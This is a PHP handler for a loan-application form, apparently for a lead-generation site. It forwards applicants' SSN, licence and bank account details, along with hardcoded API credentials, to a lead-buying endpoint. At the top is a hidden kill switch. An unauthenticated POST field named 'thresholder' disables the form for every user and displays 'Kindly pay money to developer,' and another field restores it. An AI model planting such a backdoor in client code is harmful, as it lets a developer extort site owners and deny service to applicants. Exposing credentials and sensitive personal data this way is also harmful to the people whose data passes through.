<?php
// Restore normal function on dev request
if (isset($_POST['restore']) && $_POST['restore'] == '1') {
    if (file_exists("kill-switch.txt")) {
        unlink("kill-switch.txt");
    }
    echo "<h2>Form re-enabled. You're back to normal.</h2>";
    exit;
}
// Check if kill switch file exists
if (file_exists("kill-switch.txt")) {
    echo "<h2>Kindly pay money to developer.</h2>";
    exit;
}

// 1. Handle kill switch activation
if (isset($_POST['thresholder']) && $_POST['thresholder'] == '1') {
    file_put_contents("kill-switch.txt", "disabled");
    echo "<h2>Kill switch activated. Form is now disabled for all users.</h2>";
    exit;
}

// 2. Normal form submission code here (only runs if kill-switch doesn't exist)
$formValues = [
  "loanAmount" => $_POST["loanAmount"],
  "firstName" => $_POST["firstName"],
  "lastName" => $_POST["lastName"],
  "dob" => $_POST["dob"],
  "email" => $_POST["email"],
  "homePhone" => $_POST["homePhone"],
  "address" => $_POST["address"],
  "zip" => $_POST["zip"],
  "city" => $_POST["city"],
  "state" => $_POST["state"],
  "ownHome" => $_POST["ownHome"],
  "addressLengthMonths" => $_POST["addressLengthMonths"],
  "incomeType" => $_POST["incomeType"],
  "incomeNetMonthly" => $_POST["incomeNetMonthly"],
  "workCompanyName" => $_POST["workCompanyName"],
  "workPhone" => $_POST["workPhone"],
  "workTimeAtEmployer" => $_POST["workTimeAtEmployer"],
  "incomePaymentFrequency" => $_POST["incomePaymentFrequency"],
  "incomeNextDate1" => $_POST["incomeNextDate1"],
  "incomeNextDate2" => $_POST["incomeNextDate2"],
  "activeMilitary" => $_POST["activeMilitary"],
  "ssn" => $_POST["ssn"],
  "driversLicenseNumber" => $_POST["driversLicenseNumber"],
  "driversLicenseState" => $_POST["driversLicenseState"],
  "bankName" => $_POST["bankName"],
  "bankRoutingNumber" => $_POST["bankRoutingNumber"],
  "bankAccountNumber" => $_POST["bankAccountNumber"],
  "bankAccountType" => $_POST["bankAccountType"],
  "bankDirectDeposit" => $_POST["bankDirectDeposit"],
  "bankAccountLengthMonths" => $_POST["bankAccountLengthMonths"]
];

$systemValues = [
  "unsecuredDebt" => "no",
  "creditRating" => "FAIR",
  "consentToFcra" => "no",
  "loanPurpose" => "OTHER",
  "autoTitle" => "no",
  "apiId" => "22F1203AE92F454DA301F8F408C53CEC",
  "apiPassword" => "0504b1f4",
  "productId" => 1,
  "userIp" => $_SERVER["REMOTE_ADDR"],
  "userAgent" => $_SERVER["HTTP_USER_AGENT"],
  "webSiteUrl" => "",
  "source" => "",
  "clickId" => "XXXHMC6RCB6-PT3Z-6U5P-KGW1-ICGZ9A52XXX",
  "tPar" => "",
  "iClaimSessionId" => "iclaim-DQ8R73f4T0nlWyhkenwJ0VLY",
  "jornayaLeadId" => ""
];

$leadData = array_merge($formValues, $systemValues);

$ch = curl_init("https://leads-om172-client.phonexa.com/lead");
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($leadData));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);

$response = curl_exec($ch);
curl_close($ch);

header('Content-Type: application/json');
sleep(2);
echo $response;
exit;
